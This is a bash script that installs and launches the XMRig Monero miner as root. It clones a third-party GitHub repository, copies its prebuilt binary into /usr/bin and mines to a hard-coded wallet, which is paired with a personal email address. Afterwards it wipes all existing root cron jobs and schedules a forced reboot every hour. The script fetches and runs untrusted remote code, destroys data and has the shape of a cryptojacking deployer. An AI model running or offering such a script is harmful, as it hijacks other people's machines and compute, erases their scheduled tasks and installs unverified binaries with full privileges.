#! /bin/bash
if [ "$(whoami)" != "root" ]; then
        echo -e "Sorry, you are not root. Please use sudo option"
        exit 1
fi
WALLET=449PWXiroeiJF2kzeHC4XKKea6Swt8TPLN3kfHwhwnM3L4wgvd49gksg5pH2xcchK67mb2vYex8V7dszBb6LnVGqPnsmX7n
ID="$(hostname)"
MAIL=holtzerwilly@gmail.com
PASSWORD=$ID:$MAIL
THREADS="$(nproc --all)"

echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
sudo sysctl -p
echo -e 'Installing updates and install soft...'
sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev autotools-dev automake screen htop nano mc -y
sleep 2
cd /tmp && mkdir miner
git clone https://github.com/WilliamWizard/miner-xmr.git /tmp/miner
cd /tmp/miner
chmod +x /tmp/miner/xmrig
sleep 1
cp /tmp/miner/xmrig /usr/bin/
sleep 1
#xmrig -c /tmp/miner/config.json
xmrig -o pool.supportxmr.com:5555 -u $WALLET --pass=$PASSWORD --rig-id="$(ID)" --threads=$THREADS -B -l /tmp/miner/xmrig.log --donate-level=1 --print-time=10
echo -e 'Miner started '
echo -e 'Watch: '
echo -e 'tail -f /tmp/miner/xmrig.log'
sleep 1
(sudo crontab -r 2>/dev/null;) | crontab -
echo -e 'All previous tasks are deleted'
(sudo crontab -e 2>/dev/null; echo "2 *   *   *   *  shutdown -r now") | crontab -
echo -e 'Rebooting task is created'
